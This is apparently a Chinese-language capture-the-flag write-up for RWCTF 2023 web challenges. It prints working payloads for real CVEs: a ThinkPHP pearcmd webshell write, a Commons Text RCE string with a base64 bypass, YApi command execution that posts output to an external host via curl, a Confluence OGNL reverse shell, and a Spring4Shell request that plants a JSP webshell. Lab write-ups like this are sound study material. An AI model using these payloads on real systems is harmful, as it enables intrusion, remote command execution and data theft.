---
title: "RWCTF 2023 体验赛 Web Writeup"
date: 2023-01-08T11:24:57+08:00
lastmod: 2023-01-08T11:24:57+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

Real World CTF 正赛打不动了过来打体验赛 (

<!--more-->

## Be-a-Language-Expert

thinkphp 多语言 rce (lfi + pearcmd)

[https://tttang.com/archive/1865/](https://tttang.com/archive/1865/)

[https://www.freebuf.com/vuls/352360.html](https://www.freebuf.com/vuls/352360.html)

/var/www/html 目录无权限, 所以就写在 /tmp 目录下, 然后文件包含来 getshell

```
/?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=eval($_REQUEST[1]);?>+/tmp/xzxz114.php
```

![image-20230107192924843](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071929919.png)

```
http://47.98.124.175:8080/?lang=../../../../../../../../tmp/xzxz114
```

![image-20230107193059691](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071930745.png)

## Evil MySQL Server

利用恶意 mysql 服务端来读取文件

[https://github.com/Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)

![image-20230107193328355](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071933408.png)

![image-20230107193316145](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071933201.png)

## ApacheCommandText

Apache Commons Text RCE (CVE-2022-42889)

[https://forum.butian.net/share/1973](https://forum.butian.net/share/1973)

[https://blog.csdn.net/qq_34101364/article/details/127338170](https://blog.csdn.net/qq_34101364/article/details/127338170)

`hack! [script, file, url, dns] is not allowed!`

利用 base64Decoder 绕过限制

```java
String poc = "${script:js:new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(\"/readflag\").start().getInputStream(), \"utf-8\")).readLine()}";
String exp = "${base64Decoder:" + Base64.getEncoder().encodeToString(poc.getBytes()) + "}";
```

```
${base64Decoder:JHtzY3JpcHQ6anM6bmV3IGphdmEuaW8uQnVmZmVyZWRSZWFkZXIobmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIobmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcigiL3JlYWRmbGFnIikuc3RhcnQoKS5nZXRJbnB1dFN0cmVhbSgpLCAidXRmLTgiKSkucmVhZExpbmUoKX0=}
```

![image-20230107193755286](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071937380.png)

## Yummy Api

哈哈哈首推一波学长写的利用工具

[https://github.com/Anthem-whisper/YApi-Exploit](https://github.com/Anthem-whisper/YApi-Exploit)

YApi 从 mongodb 注入获取 token 到设置 `run_auto_test` 来执行命令

```bash
python3 exp.py -target http://47.98.161.119:8080/ -action get_token_by_inject

python3 exp.py -target http://47.98.161.119:8080/ -action get_id_uid_by_token -token 8fa743801266b2391d16

python3 exp.py -target http://47.98.161.119:8080/ -action encrypt_token -uid 11 -id 66 -token 8fa743801266b2391d16

python3 exp.py -target http://47.98.161.119:8080/ -action execute_command -entoken 043454c1c1399255295ebf2fff47e5cc494108968ad05f848627c334d91ad2bc -id 66 -cmd 'curl x.x.x.x:yyyy -X POST -d "`/readflag`"'
```

基本流程就是这样, 写 wp 的时候题目服务器有点问题

然后执行命令可能会有延时

## Be-a-Wiki-Hacker

Confluence OGNL 表达式注入 (CVE-2022-26134)

[https://github.com/0x14dli/cve2022-26134exp](https://github.com/0x14dli/cve2022-26134exp)

直接反弹 shell

```bash
python3 cve2022-26134exp.py -u http://47.98.212.188:8080/ -i x.x.x.x -p 65444
```

![image-20230107195841726](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301071958760.png)

## Spring4Shell

Spring4Shell (CVE-2022-22965)

[https://www.anquanke.com/post/id/272149](https://www.anquanke.com/post/id/272149)

题目存在 git 泄露, 不过直接访问`/.git/` 会 404, 还得用工具跑一遍 (被这个坑了好长时间

```bash
githacker --url http://47.98.216.107:35974 --output-folder web
```

![image-20230107230047953](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301072300127.png)

其它文件内容都是默认的没有什么变化

server.xml 中的 appBase 变成了 `chaitin` 而不是之前的 `webapps`

最后发送 payload

```
POST / HTTP/1.1
Host: 47.98.216.107:35974
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 762

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=chaitin/xzxz&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

![image-20230107230326837](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301072303916.png)

之后注意先去访问一下 index 生成日志, 然后再访问 jsp

```
http://47.98.216.107:35974/xzxz/tomcatwar.jsp?pwd=j&cmd=find / -name flag
http://47.98.216.107:35974/xzxz/tomcatwar.jsp?pwd=j&cmd=cat /root/flag
```

![image-20230107230256902](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301072302948.png)
